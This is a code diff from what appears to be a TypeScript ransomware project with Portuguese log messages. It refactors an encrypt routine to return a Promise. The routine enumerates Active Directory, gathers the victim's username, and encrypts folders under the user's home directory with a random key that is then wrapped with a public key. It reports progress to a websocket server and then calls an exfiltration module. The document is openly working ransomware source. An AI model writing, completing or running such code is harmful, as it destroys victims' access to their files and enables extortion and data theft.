@@ -10,35 +10,72 @@ import isActive from './isActive';
 import sendLog from './websocket/client';
 import execute from './exfiltration';
 
+// const encrypt = () => {
+//   enumerateAD();
+//   isActive();
+//   const userName: string = os.userInfo().username;
+//   setTimeout(() => sendLog(`[+] -> OS USERNAME ${userName}`), 1000);
+//   const userDir: string = `C:\\Users\\${userName}`;
+//   setTimeout(
+//     () => sendLog(`[+] -> DIRETÓRIO DEFAULT DO USUÁRIO: ${userDir}`),
+//     1000,
+//   );
+//   setTimeout(() => sendLog(`[+] -> RANSOMWARE INICIADO`), 1000);
+//   const key: string = createRandomString(32);
+//   const iv: Buffer = crypto.randomBytes(16);
+
+//   for (let i = 0; i < config.targetFolder.length; i++) {
+//     console.log(i, config.targetFolder[i]);
+//     encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
+//   }
+
+//   const keyData: string = `${key}${iv.toString('hex')}`;
+//   const idCode: string = encryptPublicKey(keyData);
+
+//   setTimeout(
+//     () =>
+//       sendLog(`[+] -> RANSOMWARE FINALIZADO, IDENTIFICATION CODE: ${idCode}`),
+//     1000,
+//   );
+// };
+
 const encrypt = () => {
-  enumerateAD();
-  isActive();
-  const userName: string = os.userInfo().username;
-  setTimeout(() => sendLog(`[+] -> OS USERNAME ${userName}`), 1000);
-  const userDir: string = `C:\\Users\\${userName}`;
-  setTimeout(
-    () => sendLog(`[+] -> DIRETÓRIO DEFAULT DO USUÁRIO: ${userDir}`),
-    1000,
-  );
-  setTimeout(() => sendLog(`[+] -> RANSOMWARE INICIADO`), 1000);
-  const key: string = createRandomString(32);
-  const iv: Buffer = crypto.randomBytes(16);
+  return new Promise((resolve, reject) => {
+    try {
+      enumerateAD();
+      isActive();
+      const userName: string = os.userInfo().username;
+      setTimeout(() => sendLog(`[+] -> OS USERNAME ${userName}`), 1000);
+      const userDir: string = `C:\\Users\\${userName}`;
+      setTimeout(
+        () => sendLog(`[+] -> DIRETÓRIO DEFAULT DO USUÁRIO: ${userDir}`),
+        1000,
+      );
+      setTimeout(() => sendLog(`[+] -> RANSOMWARE INICIADO`), 1000);
+      const key: string = createRandomString(32);
+      const iv: Buffer = crypto.randomBytes(16);
 
-  for (let i = 0; i < config.targetFolder.length; i++) {
-    console.log(i, config.targetFolder[i]);
-    encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
-  }
+      for (let i = 0; i < config.targetFolder.length; i++) {
+        console.log(i, config.targetFolder[i]);
+        encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
+      }
 
-  const keyData: string = `${key}${iv.toString('hex')}`;
-  const idCode: string = encryptPublicKey(keyData);
+      const keyData: string = `${key}${iv.toString('hex')}`;
+      const idCode: string = encryptPublicKey(keyData);
 
-  setTimeout(
-    () =>
-      sendLog(`[+] -> RANSOMWARE FINALIZADO, IDENTIFICATION CODE: ${idCode}`),
-    1000,
-  );
+      setTimeout(
+        () =>
+          sendLog(
+            `[+] -> RANSOMWARE FINALIZADO, IDENTIFICATION CODE: ${idCode}`,
+          ),
+        1000,
+      );
 
-  return true;
+      resolve(true); // Resolve a Promise quando a função terminar
+    } catch (error) {
+      reject(error); // Rejeita a Promise em caso de erro
+    }
+  });
 };
 
 const encryptDir = (dir: string, key: string, iv: Buffer) => {
@@ -129,5 +166,10 @@ getPublicIP()
     console.error(err);
   });
 
-encrypt();
-execute();
+encrypt()
+  .then(() => {
+    execute();
+  })
+  .catch((error) => {
+    console.error('Erro durante a execução do encrypt:', error);
+  });
